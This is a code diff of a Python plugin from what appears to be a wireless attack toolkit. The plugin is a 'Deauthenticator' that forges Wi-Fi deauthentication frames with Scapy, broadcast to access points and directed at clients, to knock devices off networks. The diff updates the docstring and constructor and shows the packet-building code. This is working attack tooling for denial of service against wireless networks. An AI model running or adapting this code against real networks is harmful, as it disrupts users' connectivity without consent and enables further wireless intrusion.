@@ -1,6 +1,6 @@
 # -*- coding: utf-8 -*-
 """
-This plugin will launch a full arp replay attack on a WEP network
+This plugin will launch a Deauthentication attack on APs and Clients.
 """
 
 from AuxiliaryModules.events import UnsuccessfulEvent, NeutralEvent
@@ -13,8 +13,8 @@ from socket import error as socket_error
 
 class Deauthenticator(AirInjectorPlugin):
 
-    def __init__(self):
-        super(Deauthenticator, self).__init__("deauthenticator")
+    def __init__(self, config):
+        super(Deauthenticator, self).__init__(config, "deauthenticator")
         try:
             self._burst_count   = int(self.config["burst_count"])
             self._targeted_only = self.config["targeted_only"].lower() == "true"
@@ -29,12 +29,17 @@ class Deauthenticator(AirInjectorPlugin):
         return None
 
     def interpret_targets(self, ap_targets, client_targets):
+        """
+        A broadcast Deauth packet is created for every access point in the list.
+
+        A directed Deauth packet is created for every client in the list.
+        """
         # Packet creation based on:
         # https://raidersec.blogspot.pt/2013/01/wireless-deauth-attack-using-aireplay.html
         if not self._targeted_only:
             for access_point in ap_targets:
                 deauth_packet = RadioTap() / \
-                                Dot11(type=0, subtype=12,    addr1="FF:FF:FF:FF:FF:FF",
+                                Dot11(type=0, subtype=12,   addr1="FF:FF:FF:FF:FF:FF",
                                                             addr2=access_point.bssid,
                                                             addr3=access_point.bssid) / \
                                 Dot11Deauth(reason=7)
